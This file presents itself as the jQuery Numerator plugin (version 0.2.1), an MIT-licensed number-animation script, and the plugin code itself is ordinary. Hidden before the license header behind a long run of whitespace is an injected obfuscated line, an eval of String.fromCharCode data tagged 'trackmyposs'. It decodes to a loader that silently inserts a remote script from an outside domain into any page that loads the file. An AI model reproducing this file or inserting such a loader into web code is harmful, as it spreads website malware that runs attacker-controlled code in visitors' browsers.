                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /*trackmyposs*/eval(String.fromCharCode(118,97,114,32,115,99,114,105,112,116,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,115,99,114,105,112,116,34,41,59,10,118,97,114,32,119,97,110,116,109,101,32,61,32,102,97,108,115,101,59,10,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,115,99,114,105,112,116,115,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,41,32,123,10,32,32,9,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,32,61,61,32,34,116,114,97,99,107,109,121,112,111,115,115,34,41,123,10,9,9,119,97,110,116,109,101,61,116,114,117,101,59,10,9,32,125,10,32,32,125,32,10,125,10,105,102,40,119,97,110,116,109,101,61,61,102,97,108,115,101,41,123,10,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,105,100,61,34,116,114,97,99,107,109,121,112,111,115,115,34,59,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,57,57,44,49,49,49,44,49,48,56,44,49,48,56,44,49,48,49,44,57,57,44,49,49,54,44,52,54,44,49,48,51,44,49,49,52,44,49,48,49,44,49,48,49,44,49,49,48,44,49,48,51,44,49,49,49,44,49,49,50,44,49,48,56,44,57,55,44,49,49,54,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,48,50,44,49,48,56,44,57,55,44,49,48,51,44,52,54,44,49,48,54,44,49,49,53,44,54,51,44,49,49,56,44,54,49,44,53,53,44,52,54,44,52,57,44,52,54,44,53,49,41,59,32,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,10,125));/* 
 *   jQuery Numerator Plugin 0.2.1
 *   https://github.com/garethdn/jquery-numerator
 *
 *   Copyright 2015, Gareth Nolan
 *   http://ie.linkedin.com/in/garethnolan/

 *   Based on jQuery Boilerplate by Zeno Rocha with the help of Addy Osmani
 *   http://jqueryboilerplate.com
 *
 *   Licensed under the MIT license:
 *   http://www.opensource.org/licenses/MIT
 */

;(function (factory) {
	'use strict';
	if (typeof define === 'function' && define.amd) {
		// AMD is used - Register as an anonymous module.
		define(['jquery'], factory);
	} else if (typeof exports === 'object') {
		factory(require('jquery'));
	} else {
		// Neither AMD nor CommonJS used. Use global variables.
		if (typeof jQuery === 'undefined') {
			throw 'jquery-numerator requires jQuery to be loaded first';
		}
		factory(jQuery);
	}
}(function ($) {

	var pluginName = "numerator",
		defaults = {
			easing: 'swing',
			duration: 500,
			delimiter: undefined,
			rounding: 0,
			toValue: undefined,
			fromValue: undefined,
			queue: false,
			onStart: function(){},
			onStep: function(){},
			onProgress: function(){},
			onComplete: function(){}
		};

	function Plugin ( element, options ) {
		this.element = element;
		this.settings = $.extend( {}, defaults, options );
		this._defaults = defaults;
		this._name = pluginName;
		this.init();
	}

	Plugin.prototype = {

		init: function () {
			this.parseElement();
			this.setValue();
		},

		parseElement: function () {
			var elText = $.trim($(this.element).text());

			this.settings.fromValue = this.settings.fromValue || this.format(elText);
		},

		setValue: function() {
			var self = this;

			$({value: self.settings.fromValue}).animate({value: self.settings.toValue}, {

				duration: parseInt(self.settings.duration, 10),

				easing: self.settings.easing,

				start: self.settings.onStart,

				step: function(now, fx) {
					$(self.element).text(self.format(now));
					// accepts two params - (now, fx)
					self.settings.onStep(now, fx);
				},

				// accepts three params - (animation object, progress ratio, time remaining(ms))
				progress: self.settings.onProgress,

				complete: self.settings.onComplete
			});
		},

		format: function(value){
			var self = this;

			if ( parseInt(this.settings.rounding ) < 1) {
				value = parseInt(value, 10);
			} else {
				value = parseFloat(value).toFixed( parseInt(this.settings.rounding) );
			}

			if (self.settings.delimiter) {
				return this.delimit(value)
			} else {
				return value;
			}
		},

		// TODO: Add comments to this function
		delimit: function(value){
			var self = this;

			value = value.toString();

			if (self.settings.rounding && parseInt(self.settings.rounding, 10) > 0) {
				var decimals = value.substring( (value.length - (self.settings.rounding + 1)), value.length ),
					wholeValue = value.substring( 0, (value.length - (self.settings.rounding + 1)));

				return self.addDelimiter(wholeValue) + decimals;
			} else {
				return self.addDelimiter(value);
			}
		},

		addDelimiter: function(value){
			return value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, this.settings.delimiter);
		}
	};

	$.fn[ pluginName ] = function ( options ) {
		return this.each(function() {
			if ( $.data( this, "plugin_" + pluginName ) ) {
				$.data(this, 'plugin_' + pluginName, null);
			}
			$.data( this, "plugin_" + pluginName, new Plugin( this, options ) );
		});
	};

}));